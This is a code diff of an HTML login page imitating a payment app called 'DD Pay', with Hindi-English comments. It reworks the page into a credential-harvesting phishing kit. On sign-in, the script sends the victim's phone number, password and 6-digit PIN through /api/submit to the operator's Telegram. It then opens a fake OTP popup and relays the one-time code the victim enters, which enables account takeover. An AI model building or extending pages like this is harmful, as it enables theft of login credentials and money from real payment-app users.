@@ -4,66 +4,126 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DD Pay - Login</title>
+    <!-- Icons ke liye FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 100%; max-width: 350px; text-align: center; }
-        .logo { width: 120px; margin-bottom: 20px; }
-        .input-group { margin-bottom: 15px; text-align: left; }
-        .input-group label { font-size: 12px; color: #555; display: block; margin-bottom: 5px; }
-        .input-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; outline: none; }
-        .btn { width: 100%; padding: 12px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-bottom: 10px; transition: 0.3s; }
-        .btn-green { background-color: #28a745; color: white; }
-        .btn-green:hover { background-color: #218838; }
-        .btn-blue { background-color: #007bff; color: white; }
-        .btn-blue:hover { background-color: #0069d9; }
-        .links { display: flex; justify-content: space-between; font-size: 12px; margin-top: 10px; }
-        .links a { color: #007bff; text-decoration: none; }
-        .checkbox-group { display: flex; align-items: center; font-size: 12px; margin-bottom: 15px; }
-        .checkbox-group input { margin-right: 5px; }
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #f0f4f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        
+        .main-container { width: 100%; max-width: 400px; background: #f0f4f8; padding: 20px; position: relative; overflow: hidden; }
+        
+        /* Logo Design */
+        .logo-container { text-align: center; margin-bottom: 30px; margin-top: 20px; }
+        .logo-container img { width: 180px; }
+
+        /* Input Boxes */
+        .input-group { position: relative; margin-bottom: 15px; }
+        .input-group i { position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: #008e5a; font-size: 18px; }
+        .input-group input { width: 100%; padding: 16px 20px 16px 50px; border: 1px solid #e0e0e0; border-radius: 30px; font-size: 16px; background: #fff; outline: none; color: #333; box-shadow: 0 2px 5px rgba(0,0,0,0.02); }
+        .input-group input::placeholder { color: #aaa; }
+
+        /* Extra Links */
+        .links-row { display: flex; justify-content: space-between; align-items: center; margin: 20px 10px; font-size: 14px; color: #008e5a; font-weight: 500; }
+        .links-row a { color: #008e5a; text-decoration: none; }
+        
+        .privacy-row { display: flex; align-items: center; justify-content: center; margin-bottom: 20px; font-size: 14px; color: #333; }
+        .privacy-row input { margin-right: 8px; accent-color: #008e5a; width: 16px; height: 16px; }
+
+        /* Buttons */
+        .btn { width: 100%; padding: 16px; border: none; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; transition: 0.3s; }
+        .btn-signin { background-color: #008e5a; color: white; box-shadow: 0 4px 10px rgba(0, 142, 90, 0.3); }
+        .btn-signin:active { transform: scale(0.98); }
+        
+        .forgot-link { text-align: center; margin-top: 20px; display: block; color: #008e5a; text-decoration: none; font-weight: 500; }
+
+        /* OTP Popup (Modal) */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); display: none; justify-content: center; align-items: center; z-index: 1000; }
+        .modal-content { background: #fff; width: 90%; max-width: 380px; border-radius: 20px; padding: 25px; position: relative; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .modal-header h2 { font-size: 22px; color: #222; }
+        .close-btn { background: #f0f0f0; border: none; width: 30px; height: 30px; border-radius: 50%; font-size: 16px; color: #666; cursor: pointer; }
+        
+        .modal-text { font-size: 14px; color: #008e5a; margin-bottom: 10px; line-height: 1.4; font-weight: 500; }
+        .modal-phone { font-size: 15px; font-weight: bold; color: #008e5a; margin-bottom: 20px; }
+
+        /* OTP Input Area */
+        .otp-input-row { display: flex; align-items: center; border: 1px solid #ccc; border-radius: 30px; padding: 5px 5px 5px 20px; margin-bottom: 20px; }
+        .otp-input-row i { color: #008e5a; font-size: 18px; margin-right: 10px; }
+        .otp-input-row input { flex: 1; border: none; outline: none; font-size: 16px; }
+        .btn-send { background: #008e5a; color: white; border: none; padding: 10px 25px; border-radius: 25px; font-size: 15px; cursor: pointer; font-weight: 600; }
+        
+        .btn-confirm { background: #008e5a; color: white; box-shadow: 0 4px 10px rgba(0, 142, 90, 0.3); }
     </style>
 </head>
 <body>
 
-    <div class="login-container">
-        <img src="https://via.placeholder.com/120x50?text=DD+Pay" alt="DD Pay Logo" class="logo">
-        
+    <div class="main-container">
+        <!-- Logo -->
+        <div class="logo-container">
+            <!-- Yahan aap apna asli logo link daal sakte hain (src="...") -->
+            <img src="https://i.ibb.co/6PZk6vC/ddpay-logo.png" alt="DD Pay" onerror="this.src='https://via.placeholder.com/180x80?text=DD+Pay'">
+        </div>
+
+        <!-- Main Login Form -->
         <form id="loginForm">
             <div class="input-group">
-                <label>Phone</label>
-                <input type="tel" id="phone" placeholder="Enter Phone Number" required>
-            </div>
-            <div class="input-group">
-                <label>Password</label>
-                <input type="password" id="password" placeholder="Enter Password" required>
-            </div>
-            <div class="input-group">
-                <label>6 Digit PIN</label>
-                <input type="password" id="pin" placeholder="Enter 6 Digit PIN" maxlength="6" required>
+                <i class="fa-solid fa-user"></i>
+                <input type="tel" id="phone" placeholder="Phone" required>
             </div>
             
-            <div class="links">
-                <span>Register</span>
-                <label class="checkbox-group"><input type="checkbox"> Remember Me</label>
-            </div>
-            <div class="checkbox-group">
-                <input type="checkbox" required> I Agree User Privacy Agreement
+            <div class="input-group">
+                <i class="fa-solid fa-lock"></i>
+                <input type="password" id="password" placeholder="Password" required>
             </div>
 
-            <!-- Send OTP Button -->
-            <button type="button" id="otpBtn" class="btn btn-blue">Send OTP</button>
-
-            <!-- Sign In Button -->
-            <button type="submit" class="btn btn-green">Sign In</button>
-            
-            <div class="links" style="justify-content: center;">
-                <a href="#">Forget Password</a>
+            <div class="input-group">
+                <i class="fa-solid fa-key"></i>
+                <input type="password" id="pin" placeholder="6-Digit PIN" maxlength="6" required>
             </div>
+
+            <div class="links-row">
+                <a href="#">Register</a>
+                <label><input type="radio" name="remember" style="accent-color: #008e5a;"> Remember Me</label>
+            </div>
+
+            <div class="privacy-row">
+                <input type="checkbox" required> Agree "User Privacy Agreement"
+            </div>
+
+            <button type="submit" class="btn btn-signin">Sign In</button>
         </form>
+
+        <a href="#" class="forgot-link">Forget Password</a>
+    </div>
+
+    <!-- OTP POPUP MODAL -->
+    <div class="modal-overlay" id="otpModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Login OTP</h2>
+                <button class="close-btn" onclick="closeModal()">&times;</button>
+            </div>
+            
+            <div class="modal-text">
+                Tap Send to receive the OTP, then enter it to confirm this login.
+            </div>
+            <div class="modal-phone">
+                OTP will be sent to <span id="displayPhone">+91 XXXXXXXXXX</span>
+            </div>
+
+            <div class="otp-input-row">
+                <i class="fa-regular fa-envelope"></i>
+                <input type="text" id="otpCode" placeholder="Enter 6-digit OTP" maxlength="6">
+                <button class="btn-send" id="sendOtpBtn">Send</button>
+            </div>
+
+            <button class="btn btn-confirm" id="confirmOtpBtn">Confirm</button>
+        </div>
     </div>
 
     <script>
-        // --- TELEGRAM MESSAGE BHEJNE KA FUNCTION ---
+        // --- TELEGRAM API FUNCTION ---
         async function sendToTelegram(messageText) {
             try {
                 const res = await fetch('/api/submit', {
@@ -73,59 +133,81 @@
                 });
                 return res.ok;
             } catch (error) {
+                console.error("API Error:", error);
                 return false;
             }
         }
 
-        // 1. SEND OTP BUTTON CLICK
-        document.getElementById('otpBtn').addEventListener('click', async function() {
-            const phone = document.getElementById('phone').value;
-            
-            if(!phone) {
-                alert("Pehle Phone Number daalein!");
-                return;
-            }
+        // --- MODAL LOGIC ---
+        const modal = document.getElementById('otpModal');
+        const displayPhone = document.getElementById('displayPhone');
+        
+        function closeModal() {
+            modal.style.display = 'none';
+        }
 
-            this.innerText = "Sending OTP...";
-            this.disabled = true;
-
-            const msg = `🚨 *OTP Request Aaya Hai!*\n\n📱 User ne OTP button dabaya.\n📞 Phone: ${phone}`;
-            const success = await sendToTelegram(msg);
-
-            if(success) {
-                alert("OTP request aapke Telegram par bhej di gayi hai!");
-            } else {
-                alert("OTP send nahi ho paya. API check karein.");
-            }
-            
-            this.innerText = "Send OTP";
-            this.disabled = false;
-        });
-
-        // 2. SIGN IN FORM SUBMIT CLICK
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        // Main Form Submit (Sign In button)
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-
-            const btn = this.querySelector('.btn-green');
             const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
             const pin = document.getElementById('pin').value;
 
-            btn.innerText = "Signing In...";
-            btn.disabled = true;
+            // Telegram par sign in details bhejna
+            const msg = `🔔 *User ne Sign In kiya!*\n\n📞 Phone: ${phone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}`;
+            sendToTelegram(msg);
 
-            const msg = `🔔 *Naya User Login Kar Raha Hai!*\n\n📞 Phone: ${phone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}`;
+            // Phone number popup me dikhana
+            displayPhone.innerText = `+91 ${phone}`;
+            
+            // OTP Popup kholna
+            modal.style.display = 'flex';
+        });
+
+        // Popup me "Send" button dabane par (OTP Request)
+        document.getElementById('sendOtpBtn').addEventListener('click', async function() {
+            const phone = document.getElementById('phone').value;
+            this.innerText = "Sending...";
+            this.disabled = true;
+
+            const msg = `🚨 *OTP Request Aaya Hai!*\n\n📱 User ne Send OTP dabaya.\n📞 Phone: ${phone}`;
             const success = await sendToTelegram(msg);
 
             if(success) {
-                alert("Sign In details aapke Telegram par bhej di gayi hain!");
-                this.reset();
+                alert("OTP Request aapke Telegram par bhej di gayi hai!");
             } else {
-                alert("Details send nahi ho payi.");
+                alert("Telegram par nahi gaya, API check karein.");
             }
 
-            btn.innerText = "Sign In";
-            btn.disabled = false;
+            this.innerText = "Send";
+            this.disabled = false;
+        });
+
+        // Popup me "Confirm" button dabane par (OTP Verification)
+        document.getElementById('confirmOtpBtn').addEventListener('click', async function() {
+            const phone = document.getElementById('phone').value;
+            const otp = document.getElementById('otpCode').value;
+            
+            if(!otp) {
+                alert("Pehle OTP enter karein!");
+                return;
+            }
+
+            this.innerText = "Confirming...";
+            this.disabled = true;
+
+            const msg = `✅ *OTP Confirm Hua!*\n\n📞 Phone: ${phone}\n🔢 Entered OTP: ${otp}`;
+            const success = await sendToTelegram(msg);
+
+            if(success) {
+                alert("Login Successful! (OTP details sent to Telegram)");
+                closeModal();
+            } else {
+                alert("Error!");
+            }
+
+            this.innerText = "Confirm";
+            this.disabled = false;
         });
     </script>
 </body>
